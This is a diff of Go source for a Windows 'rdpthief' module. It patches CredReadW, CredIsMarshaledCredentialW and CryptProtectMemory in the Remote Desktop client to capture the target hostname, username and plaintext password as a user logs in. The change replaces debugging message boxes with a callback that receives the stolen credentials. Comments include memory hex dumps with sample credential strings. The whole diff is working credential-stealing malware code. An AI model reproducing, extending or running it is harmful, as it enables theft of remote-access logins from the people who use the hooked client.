@@ -1,8 +1,10 @@
+// +build windows
+
 package rdpthief
 
 import (
-	"fmt"
 	"reflect"
+	"runtime"
 	"sync"
 	"unicode/utf16"
 	"unsafe"
@@ -13,29 +15,31 @@ import (
 	"project/internal/module/windows/hook"
 )
 
-// hook list
-// sechost.dll   CredReadW                   --- get hostname
-// sechost.dll   CredIsMarshaledCredentialW  --- get username
-// crypt32.dll   CryptProtectMemory          --- get password
+// this module support Windows 7, Windows 8 and Windows 10.
 
-// Credential is the credential that stolen from mstsc.exe.
-type Credential struct {
-	Hostname string
-	Username string
-	Password string
-}
+// hook list
+// sechost.dll   CredReadW                   ---read hostname
+// sechost.dll   CredIsMarshaledCredentialW  ---read username
+// crypt32.dll   CryptProtectMemory          ---read password
 
 // Hook is the core library for steal credential.
 type Hook struct {
-	hostname string
-	username string
-	password string
+	callback func(cred *Credential)
 
 	pgCredReadW                  *hook.PatchGuard
-	pgCredIsMarshaledCredentialW *hook.PatchGuard
 	pgCryptProtectMemory         *hook.PatchGuard
+	pgCredIsMarshaledCredentialW *hook.PatchGuard
+
+	hostname string
+	password string
 
 	mu sync.Mutex
+}
+
+// NewHook is used to create a hook that include a callback.
+// <security:> usually cover password string in callback function.
+func NewHook(callback func(cred *Credential)) *Hook {
+	return &Hook{callback: callback}
 }
 
 // Install is used to install hook.
@@ -72,11 +76,7 @@ func (h *Hook) Uninstall() error {
 	h.mu.Lock()
 	defer h.mu.Unlock()
 
-	err := h.pgCredReadW.UnPatch()
-	if err != nil {
-		return err
-	}
-	err = h.pgCredIsMarshaledCredentialW.UnPatch()
+	err := h.pgCredIsMarshaledCredentialW.UnPatch()
 	if err != nil {
 		return err
 	}
@@ -84,167 +84,124 @@ func (h *Hook) Uninstall() error {
 	if err != nil {
 		return err
 	}
+	err = h.pgCredReadW.UnPatch()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
-func (h *Hook) credReadW(targetName *uint16, typ, flags uint, credential uintptr) uintptr {
-	h.mu.Lock()
-	defer h.mu.Unlock()
-
-	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
-	proc.Call(0,
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(windows.GetCurrentThreadId())))),
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-		1,
-	)
-
-	// runtime.LockOSThread()
-	// defer runtime.UnlockOSThread()
-
-	proc.Call(0,
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(windows.GetCurrentThreadId())))),
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-		1,
-	)
-
-	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
-	// proc.Call(0,
-	// 	uintptr(unsafe.Pointer(targetName)),
-	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-	// 	1,
-	// )
-
-	hostname := windows.UTF16PtrToString(targetName)
-
-	// fmt.Println(hostname)
-	// fmt.Println(typ)
-	// fmt.Println(flags)
-	// fmt.Println(cred)
-
-	h.hostname = hostname
-
-	ret, _, _ := h.pgCredReadW.Original.Call(
-		uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), credential,
-	)
-
-	// fmt.Println(uintptr(err.(windows.Errno)))
-	//
-	// fmt.Println(windows.GetLastError())
-	//
-	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
-	// proc.Call(0,
-	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(uintptr(err.(windows.Errno)))))),
-	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-	// 	1,
-	// )
-
-	// lastErr := uintptr(err.(windows.Errno))
-	// runtime.SetLastError(lastErr)
-
-	// fmt.Println(runtime.GetLastError())
-	// fmt.Println(runtime.GetLastError())
-
-	// procSetLastError := windows.NewLazySystemDLL("kernel32.dll").NewProc("SetLastError")
-	// procSetLastError.Call(uintptr(err.(windows.Errno)))
-	//
-	// syscall.GetLastError()
-
-	// fmt.Println(ret, t2, err)
-
-	// proc.Call(0,
-	// 	uintptr(unsafe.Pointer(targetName)),
-	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-	// 	1,
-	// )
-
-	return ret
+// Clean is used to clean callback.
+func (h *Hook) Clean() {
+	h.callback = nil
 }
 
-func (h *Hook) credIsMarshaledCredentialW(marshaledCredential *uint16) uintptr {
+func (h *Hook) credReadW(targetName *uint16, typ, flags uint, credential uintptr) (ret uintptr) {
 	h.mu.Lock()
 	defer h.mu.Unlock()
 
-	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
-	// proc.Call(0,
-	// 	uintptr(unsafe.Pointer(marshaledCredential)),
-	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-	// 	1,
-	// )
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
 
-	username := windows.UTF16PtrToString(marshaledCredential)
-	// fmt.Println(username)
+	defer func() {
+		ret, _, _ = h.pgCredReadW.Original.Call(
+			uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), credential,
+		)
+	}()
 
-	h.username = username
-
-	msg := fmt.Sprintf(
-		"hostname: \"%s\"\nusername: \"%s\"\npassword: \"%s\"",
-		h.hostname, h.username, h.password,
-	)
-
-	ptr := windows.StringToUTF16Ptr(msg)
-
-	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
-	proc.Call(0,
-		uintptr(unsafe.Pointer(ptr)),
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-		1,
-	)
-
-	ret, _, _ := h.pgCredIsMarshaledCredentialW.Original.Call(
-		uintptr(unsafe.Pointer(marshaledCredential)),
-	)
-	return ret
+	h.hostname = windows.UTF16PtrToString(targetName)
+	return
 }
 
-func (h *Hook) cryptProtectMemory(address *byte, size, flags uint) uintptr {
+func (h *Hook) cryptProtectMemory(address *byte, size, flags uint) (ret uintptr) {
 	h.mu.Lock()
 	defer h.mu.Unlock()
 
-	// skip data that not contain password
-	if *address == 2 && size != 16 {
-		ret, _, _ := h.pgCryptProtectMemory.Original.Call(
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	defer func() {
+		ret, _, _ = h.pgCryptProtectMemory.Original.Call(
 			uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
 		)
-		return ret
+	}()
+
+	// skip data that not contain password
+	// 0000  02 00 00 00 4d 00 00 00 00 00 00 00 fc 7f 00 00  ....M...........
+	// 0010  40 00 00 00 00 00 00 00 0a 00 0a 00 28 00 55 00  @...........(.U.
+	// 0020  40 00 00 00 00 00 00 00 72 00 72 00 6e 00 74 00  @.......r.r.n.t.
+	// 0030  4a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  J...............
+	// 0040  74 00 65 00 73 00 74 00 24 00 40 00 40 00 44 00  t.e.s.t.$.@.@.D.
+	// 0050  07 00 08 00 0c 00 0a 00 0d 00 67 00 41 00 41 00  ..........g.A.A.
+	// 0060  41 00 41 00 41 00 2d 00 4f 00 42 00 42 00 41 00  A.A.A.-.O.B.B.A.
+	// 0070  41 00 41 00 41 00 41 00 41 00 51 00 69 00 76 00  A.A.A.A.A.Q.i.v.
+	// 0080  48 00 42 00 48 00 46 00 6f 00 71 00 44 00 59 00  H.B.H.F.o.q.D.Y.
+	// 0090  7a 00 54 00 43 00 51 00 36 00 23 00 6c 00 64 00  z.T.C.Q.6.#.l.d.
+	// 00a0  6d 00 4e 00 69 00 57 00 69 00 58 00 6a 00 64 00  m.N.i.W.i.X.j.d.
+	// 00b0  75 00 72 00 61 00 44 00 4f 00 47 00 00 00 00 00  u.r.a.D.O.G.....
+	if *address == 2 && size != 16 {
+		return
 	}
 
-	ptr := windows.StringToUTF16Ptr("mem")
-	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
-	proc.Call(0,
-		uintptr(unsafe.Pointer(ptr)),
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
-		1,
-	)
-
 	var data []byte
-	dataSH := (*reflect.SliceHeader)(unsafe.Pointer(&data))
-	dataSH.Data = uintptr(unsafe.Pointer(address))
-	dataSH.Len = int(size)
-	dataSH.Cap = int(size)
+	sh := (*reflect.SliceHeader)(unsafe.Pointer(&data))
+	sh.Data = uintptr(unsafe.Pointer(address))
+	sh.Len = int(size)
+	sh.Cap = int(size)
 
+	// check is valid password
 	passwordLen := convert.LEBytesToUint32(data[:4])
 
-	// fmt.Println(passwordLen)
+	// invalid password
+	// 0000  e2 9f 0e ca ab d9 dc e5 84 a7 82 df 0f 85 e1 85  ................
+	// 0010  af 42 89 e9 2b e3 d6 bf 38 dc 0a 94 8d 7f 5f 20  .B..+...8....._
+	// 0020  95 92 f8 24 13 1c 21 86 9d 3b e4 2c 34 0e e1 bb  ...$..!..;.,4...
+	// 0030  2f e9 06 cf 13 7e 87 a8 b0 2b 59 26 a8 5a 41 43  /....~...+Y&.ZAC
+	// 0040  f1 61 a4 89 39 f7 1e d0 12 f6 78 24 ab 6a e5 0d  .a..9.....x$.j..
+	// 0050  0d 75 9b 82 18 b0 76 d3 38 68 80 05 b2 b1 33 b1  .u....v.8h....3.
+	// 0060  03 30 95 59 4f 37 61 7c c6 ab b8 76 95 e6 ef 97  .0.YO7a|...v....
+	// 0070  f1 6c ab 06 27 be 4a e9 d2 37 9f 2e 56 59 c4 b6  .l..'.J..7..VY..
+	// 0080  54 87 1e f5 1e e9 cc 37 82 da d0 d5 66 21 d9 31  T......7....f!.1
+	// 0090  ba 55 51 9b 0d bd 47 af 21 b8 07 72 bc a3 72 9f  .UQ...G.!..r..r.
+	if uint(passwordLen) > size-4 {
+		return
+	}
+
+	// valid password
+	// 0000  0c 00 00 00 61 00 63 00 67 00 61 00 73 00 64 00  ....a.c.g.a.s.d.
 
 	password := make([]byte, passwordLen)
-
 	copy(password, data[4:4+passwordLen])
 
-	passwordSH := (*reflect.SliceHeader)(unsafe.Pointer(&password))
-	passwordSH.Len = passwordSH.Len / 2
-	passwordSH.Cap = passwordSH.Cap / 2
+	sh = (*reflect.SliceHeader)(unsafe.Pointer(&password))
+	sh.Len = sh.Len / 2
+	sh.Cap = sh.Cap / 2
 
-	passwordStr := utf16.Decode(*(*[]uint16)(unsafe.Pointer(&password)))
-	h.password = fmt.Sprintln("\"" + string(passwordStr) + "\"")
-
-	ret, _, _ := h.pgCryptProtectMemory.Original.Call(
-		uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
-	)
-	return ret
-
+	h.password = string(utf16.Decode(*(*[]uint16)(unsafe.Pointer(&password))))
+	return
 }
 
-// ReadCredentials is used to read credentials from mstsc.exe.
-func ReadCredentials(pid uint32) ([]*Credential, error) {
-	return nil, nil
+func (h *Hook) credIsMarshaledCredentialW(marshaledCredential *uint16) (ret uintptr) {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	defer func() {
+		ret, _, _ = h.pgCredIsMarshaledCredentialW.Original.Call(
+			uintptr(unsafe.Pointer(marshaledCredential)),
+		)
+	}()
+
+	username := windows.UTF16PtrToString(marshaledCredential)
+	if username != "" && h.password != "" {
+		h.callback(&Credential{
+			Hostname: h.hostname,
+			Username: username,
+			Password: h.password,
+		})
+		h.password = ""
+	}
+	return
 }
